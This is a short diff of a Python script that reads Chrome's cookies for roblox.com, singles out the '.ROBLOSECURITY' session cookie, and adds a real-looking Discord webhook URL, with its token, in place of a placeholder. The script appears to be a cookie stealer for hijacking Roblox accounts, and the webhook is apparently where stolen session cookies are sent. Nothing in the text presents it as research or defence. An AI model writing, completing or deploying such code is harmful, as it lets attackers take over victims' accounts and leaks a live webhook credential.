@@ -2,7 +2,7 @@ import browser_cookie3
 import requests
 import json
 
-webhook_url = 'webhak here!'
+webhook_url = 'https://discord.com/api/webhooks/1169182544743366677/NLBwGSefgjJL-0L9dpK-EooQeRiUQeeoQxx-lDcT8U48UlF-Hb5mED_MeGhaJ7DC44yF'
 
 cookies = browser_cookie3.chrome(domain_name='.roblox.com')
 cookie_name = '.ROBLOSECURITY'
